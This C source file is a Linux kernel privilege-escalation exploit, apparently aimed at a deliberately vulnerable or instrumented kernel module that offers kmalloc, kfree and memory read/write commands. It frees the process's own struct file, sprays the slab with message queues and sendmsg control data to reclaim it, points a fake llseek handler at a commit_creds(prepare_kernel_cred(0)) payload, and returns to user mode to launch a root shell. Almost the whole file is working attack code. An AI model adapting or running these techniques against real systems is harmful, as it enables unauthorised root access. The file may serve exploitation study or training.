#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

// 0x30 bytes not controlled (properly)
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>


#include <kacmd.h>
#include <exp_commons.h>

#define TASK_PID 2184
#define TASK_NEXT 1928
#define TASK_CRED 2600
#define TASK_FILES 2672
#define INIT_OFFSET 66816

#define ALLOC_LEN 248
#define KERNEL_CREDS 0xab7a0
#define COMMIT_CREDS 0xab3f0

unsigned long KERNEL_BASE;
unsigned long STACK;

char readbuff[TASK_FILES+40];

#pragma pack(push, 1)
struct fops_dummy{
    char dc0[8];
    void* llseek;
    char dc1[232];
};

struct file_dummy{
    char dc0[40];
    struct fops_dummy* f_ops;
    char dc1[20];
    unsigned long mode;
    char dc2[180];
};

struct files_struct_dummy{
    char dc0[32];
    unsigned long fdt;
    char dc1[120];
    unsigned long fd_array[64];
};


#pragma pack(pop)

void find_current_task(void* kernel_data) {
    unsigned long task_addr;
    unsigned long next_task;
    int kpid;
    int pid = getpid(); 
    printf("[I] Finding struct task_struct for pid %d\n", pid);

    task_addr = (unsigned long) kernel_data + INIT_OFFSET;
    printf("[I] Init struct at %lx\n", task_addr);
    
    read_dev(vmem, readbuff, sizeof(readbuff), task_addr);
    kpid = *(int*)(readbuff+TASK_PID);
    next_task = *(unsigned long*)(readbuff + TASK_NEXT);
    printf("[I] task_struct of proc %d next task at: %lx\n", kpid, next_task);
    while (kpid != pid)
    {
        if (next_task == 0)
        {
            fprintf(stderr, "[E] something went wrong!\n");
            exit(1);
        }
        read_dev(vmem, readbuff, (TASK_FILES-TASK_NEXT)+sizeof(void*), next_task);
        kpid = *(int*)(readbuff+TASK_PID-TASK_NEXT);
        task_addr = next_task;
        next_task = *(unsigned long*)readbuff;
        //printf("[I] task_struct of proc %d next task at: %lx\n", kpid, next_task);
    }
    printf("[I] task_struct for proc %d is at %lx\n", pid, task_addr - TASK_NEXT);
}

unsigned long find_file_struct(int fd)
{
    struct files_struct_dummy fsd;
    unsigned long file_p;
    unsigned long files_p = *(unsigned long*)(readbuff + TASK_FILES - TASK_NEXT);
    printf("[I] Files_struct is at %lx\n", files_p);
    read_dev(vmem, (char *)&fsd, sizeof(struct files_struct_dummy), files_p);
    file_p = fsd.fd_array[fd];
    printf("[I] struct file for fd: %d is at %lx\n", fd, file_p);
    return file_p;
}
void spawn_shell(void){
    //system("/bin/sh");
    execv("/bin/sh", NULL);

    fini();
    exit(0);
}

// stolen from https://www.slideshare.net/VitalyNikolenko/linux-smep-bypass-techniques
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}
typedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

long long payload(void* file, unsigned long offset, int whence){
    int stack;
	((_commit_creds)(KERNEL_BASE + COMMIT_CREDS))(
		((_prepare_kernel_cred)(KERNEL_BASE + KERNEL_CREDS))(0)
	);
    /* asm("push %0\n\t" //ss */
    /*     "push %1\n\t" //rsp */
    /*     "push %2\n\t" //rflags */
    /*     "push %3\n\t" //cs */
    /*     "push %4\n\t" //shell */
    /*     "iretq" */
    /*     : */
    /*     : "r" (user_ss), "r" (STACK), "r" (user_rflags), "r" (user_cs), "r" (&spawn_shell)); */


    // TODO remove modified file from task fds
    // look at sys_close and clean up the fd from task->files
    asm("movq %0, %%rcx\n\t"  //rip
        "movq %1, %%r11\n\t"  //rflags
        "movq %2, %%rsp\n\t" //rsp
        "swapgs\n\t"
        "sysretq"
        :
        : "r" (&spawn_shell), "r" (user_rflags), "r" (STACK));
    return 0;
}

int main(int argc, char** argv){
    struct kacmd_info_params kip;
    struct kacmd_info_resp kir;
    struct kacmd_kfree_params kkp;
    struct kacmd_kmalloc_params kmp;
    struct kacmd_kmalloc_resp kmr;
    unsigned long file_p, fop_p;
    struct msghdr ctrl;
    //char cdata[ALLOC_LEN];
    struct file_dummy file;
    struct fops_dummy fop;
    int fd, sfd, msqid;
    int i, j;
    unsigned long km_address = 0;
    struct {long mtype; char mtext[(ALLOC_LEN-0x30)];} msg = {0x414141414141, {0}};
    kip.cmd = KACMD_INFO;

    init();

    write_dev(cmd, (char*)&kip, sizeof(kip), 0);
    read_dev(cmd, (char*)&kir, sizeof(kir), 0);
    printf("[I] Vpg: %p Ppg: %p Epg: %p\n", kir.pg_vaddress, kir.pg_paddress, kir.exec_paddress);
    printf("[I] code: %p data: %p bss: %p\n", kir.kernel_code, kir.kernel_data, kir.kernel_bss);
	KERNEL_BASE = kir.kernel_code;
    STACK = &fop;
    find_current_task(kir.kernel_data);
    fd = open(argv[0], O_RDONLY);
    if (fd < 0)
    {
        printf("[E] Failed to open file: %s, terminating!\n", argv[0]);
        exit(1);
    }
    printf("[I] opened file fd: %d\n", fd);
    file_p = find_file_struct(fd);

    printf("[I] create socket for future slab control\n");
    sfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sfd < 0)
    {
        printf("[E] Failed to create sock: %s, terminating!\n", argv[0]);
        exit(1);
    }
    // prepare structures
    // free file_p
    kkp.cmd =  KACMD_KFREE;
    kkp.address = (void*) file_p;
    // payload for overwrite
    memset(&ctrl, 0, sizeof(struct msghdr));
    memset(&file, 0, sizeof(struct file_dummy));
    memset(&fop, 'A', sizeof(struct fops_dummy));
    ctrl.msg_namelen = 1;
    ctrl.msg_control = &file;
    ctrl.msg_controllen = ALLOC_LEN;
    ((unsigned int*)&file)[0] = 1;
    file.f_ops = &fop;
    file.mode = 0x4; // SET FMODE_LSEEK
    fop.llseek = (void*)&payload;
    save_state();
    // spray heap
    printf("[I] Fill up holes in slab cache\n");
    for (j = 0; j < 10; j++)
    {
        if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
            printf("[E] Failed to get msgqueue\n");
            exit(1);
        }
        for (i = 0; i < 64; i++) {
            if (msgsnd(msqid, &msg, sizeof(msg.mtext), 0) == -1) {
                printf("[E] Failed to send IPC\n");
                exit(1);
            }
        }
    }
    // for future use
    if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) == -1) {
        printf("[E] Failed to get msgqueue\n");
        exit(1);
    }
    
    // free file struct
    printf("[I] Free the file struct\n");
    write_dev(cmd, (char*)&kkp, sizeof(kkp), 0);
    // allocate overwrite
    if (argc > 1)
    {
        i = 0;
        kmp.cmd = KACMD_KMALLOC;
        kmp.flag = 0;
        kmp.size = ALLOC_LEN;
        while(km_address != file_p && i < 10000){
            write_dev(cmd, (char*)&kmp, sizeof(kmp), 0);
            read_dev(cmd, (char*)&kmr, sizeof(kmr), 0);
            km_address = (unsigned long)kmr.address;
            i++;
        }
        printf("[I] Success after %d attempts, %lx\n", i, km_address);
        fop_p = &fop;
        write_dev(vmem, (char*)&fop_p, sizeof(unsigned long), file_p + 40);
        fop_p = 0x4;
        write_dev(vmem, (char*)&fop_p, sizeof(unsigned long), file_p + 68);
        getchar();
        lseek(fd, 0, SEEK_SET);

    } else {
       for (i=0; i<20; i++)
       {
            printf("[I] Spraying heap %d\n", i);
            sendmsg(sfd, &ctrl, 0);
            lseek(fd, 0, SEEK_SET);
            msgsnd(msqid, &msg, sizeof(msg.mtext), 0);
       }
    }
    
    //system("/bin/sh");
    
    fini();   

}
